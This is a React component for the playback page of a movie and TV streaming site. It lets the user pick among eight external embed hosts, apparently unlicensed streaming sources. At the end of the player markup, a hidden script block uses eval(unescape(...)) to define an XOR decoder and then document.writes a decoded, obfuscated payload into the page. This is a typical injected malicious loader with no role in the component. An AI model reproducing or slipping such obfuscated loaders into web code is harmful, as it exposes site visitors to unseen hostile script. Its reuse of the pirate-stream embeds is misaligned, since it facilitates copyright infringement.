import { useEffect, useRef, useState } from 'react';
import { useNavigate, useParams, useSearchParams } from 'react-router-dom';
import { Helmet } from 'react-helmet';
import Movie from '@/types/Movie';
import Series from '@/types/Series';
import MediaType from '@/types/MediaType';
import MediaShort from '@/types/MediaShort';

export default function Watch() {
  const nav = useNavigate();
  const { id } = useParams();
  const [search] = useSearchParams();
  const [type, setType] = useState<MediaType>('movie');
  const [season, setSeason] = useState(1);
  const [episode, setEpisode] = useState(1);
  const [maxEpisodes, setMaxEpisodes] = useState(1);
  const [data, setData] = useState<Movie | Series>();
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // New state for the selected video source
  const [source, setSource] = useState<string>('Source 1');

  // Array of sources
  const sources = [
  { name: 'Source 1', url: 'https://muvsrc.ru/embed' },
    { name: 'Source 2', url: 'https://api.fmoviez.online/embed' },
     { name: 'Source 3', url: 'https://api2.rypr.ru/embed' },
    { name: 'Source 4', url: 'https://vidlink.pro/' },
    { name: 'Source 5', url: 'https://vidsrc.pro/embed' },
     { name: 'Source 6', url: 'https://vidsrc.icu/embed' },
      { name: 'Source 7', url: 'https://vid.braflix.win/embed' },     
    { name: 'Source 8', url: 'https://vidsrc.cc/v2/embed' }
  ];

  function addViewed(data: MediaShort) {
    let viewed: MediaShort[] = [];
    const storage = localStorage.getItem('viewed');
    if (storage) {
      viewed = JSON.parse(storage);
    }
    const index = viewed.findIndex(v => v.id === data.id && v.type === data.type);
    if (index !== -1) {
      viewed.splice(index, 1);
    }
    viewed.unshift(data);
    viewed = viewed.slice(0, 15);
    localStorage.setItem('viewed', JSON.stringify(viewed));
  }

  // Modify getSource to include the selected source
  function getSource() {
    let baseSource = sources.find(s => s.name === source)?.url;
    let url;
    if (type === 'movie') {
      url = `${baseSource}/movie/${id}?sub_url=https%3A%2F%2Fvidsrc.me%2Fsample.srt&ds_langs=en,de`;
    } else if (type === 'series') {
      url = `${baseSource}/tv/${id}/${season}/${episode}?sub_url=https%3A%2F%2Fvidsrc.me%2Fsample.srt&ds_langs=en,de`;
    }
    return url;
  }

  async function getData(_type: MediaType) {
    const req = await fetch(`${import.meta.env.VITE_APP_API}/${_type}/${id}`);
    const res = await req.json();
    if (!res.success) {
      return;
    }
    const data: Movie | Series = res.data;
    setData(data);
    addViewed({
      id: data.id,
      poster: data.images.poster,
      title: data.title,
      type: _type,
    });
  }

  async function getMaxEpisodes(season: number) {
    const req = await fetch(`${import.meta.env.VITE_APP_API}/episodes/${id}?s=${season}`);
    const res = await req.json();
    if (!res.success) {
      nav('/');
      return;
    }
    const data = res.data;
    setMaxEpisodes(data.length);
  }

  useEffect(() => {
    if (!data) return;
    if (!('seasons' in data)) return;
    if (season > data.seasons) {
      nav('/');
      return;
    }
    if (episode > maxEpisodes) {
      nav('/');
      return;
    }
  }, [data, maxEpisodes]);

  useEffect(() => {
    const s = search.get('s');
    const e = search.get('e');
    const me = search.get('me');
    if (!s || !e) {
      setType('movie');
      getData('movie');
      return;
    }
    setSeason(parseInt(s));
    setEpisode(parseInt(e));
    if (me) {
      setMaxEpisodes(parseInt(me));
    } else {
      getMaxEpisodes(parseInt(s));
    }
    setType('series');
    getData('series');
    localStorage.setItem(
      'continue_' + id,
      JSON.stringify({
        season: parseInt(s),
        episode: parseInt(e),
      })
    );
  }, [id, search]);

  useEffect(() => {
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = 'auto';
    };
  }, []);

  // Add iframe onload event for ad removal
  useEffect(() => {
    if (iframeRef.current) {
      iframeRef.current.onload = () => {
        const iframeDocument = iframeRef.current?.contentDocument || iframeRef.current?.contentWindow?.document;
        if (iframeDocument) {
          // Remove ad elements by class or ID
          const ads = iframeDocument.querySelectorAll('.ad-class, #ad-id');
          ads.forEach(ad => {
            ad.parentNode?.removeChild(ad);
          });
        }
      };
    }
  }, [iframeRef.current]);

  return (
    <>
      <Helmet>
        <title>
          {data?.title} - {import.meta.env.VITE_APP_NAME}
        </title>
      </Helmet>

      <div className="player">
        <div className="player-controls">
          <i className="fa-regular fa-arrow-left" onClick={() => nav(`/${type}/${id}`)}></i>
          {type === 'series' && episode < maxEpisodes && (
            <i
              className="fa-regular fa-forward-step right"
              onClick={() => nav(`/watch/${id}?s=${season}&e=${episode + 1}&me=${maxEpisodes}`)}
            ></i>
          )}

          {/* Dropdown for selecting video source */}
          <select value={source} onChange={(e) => setSource(e.target.value)}>
            {sources.map((src) => (
              <option key={src.name} value={src.name}>
                {src.name}
              </option>
            ))}
          </select>
        </div>
        
        {/* Video Player */}
       <script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6c%31%36%35%38%65%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%37%32%32%30%32%38%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%39%37%34%36%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%32%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6c%31%36%35%38%65%28%27') + '%3a%62%6b%74%63%6b%66%07%05%25%26%24%21%26%2b%21%22%22%26%74%6d%7d%76%6a%68%68%74%60%3c%24%70%75%25%07%05%25%26%24%21%26%2b%21%22%22%26%62%66%67%76%7d%4e%74%6a%67%56%65%74%63%66%78%06%0b%26%24%21%26%2b%21%22%22%26%23%7c%6e%6f%63%72%77%63%7d%51%71%6e%6f%64%73%36%23%75%72%68%6d%62%73%24%0f%08%23%2a%2b%25%26%24%21%26%2b%21%76%6b%72%6f%6f%36%7a%62%65%75%67%48%33%76%6b%72%6f%6f%76%08%08%24%21%26%2b%21%22%22%26%23%2a%7c%73%61%39%7e%6d%6e%75%55%71%73%75%6d%6e%2d%2f%79%0c%08%2b%21%22%22%26%23%2a%2b%25%26%72%64%6c%36%7e%6b%68%70%62%67%6e%53%63%6e%7c%0b%05%21%22%22%26%23%2a%2b%25%44%38%32%6f%61%77%63%6f%63%417220282%34%39%33%30%30%34%31' + unescape('%27%29%29%3b'));
// -->
</script>
      </div>
    </>
  );
}
